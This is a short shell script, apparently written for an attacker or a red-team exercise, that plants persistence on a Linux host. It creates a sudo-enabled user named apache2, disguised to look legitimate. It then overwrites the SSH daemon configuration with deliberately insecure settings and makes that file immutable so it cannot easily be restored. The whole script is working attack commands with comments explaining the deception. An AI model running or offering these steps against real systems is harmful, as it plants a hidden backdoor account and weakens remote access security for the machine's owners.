#!/bin/sh

# First, we're going to create a new user account named apache2 with home directory
# /var/www/apache2 to look somewhat legitimate, and add it to the sudo group
mkdir /var/www/apache2
useradd -d /var/www/apache2 -s /bin/bash apache2
usermod -aG sudo apache2
passwd apache2

# Next, we're going to go ahead and change the settings in their sshd_config file
# to the worst settings possible with the sshd_config file in this directory, and make it
# immutable.
cp sshd_config /etc/ssh/sshd_config
chattr +i /etc/ssh/sshd_config
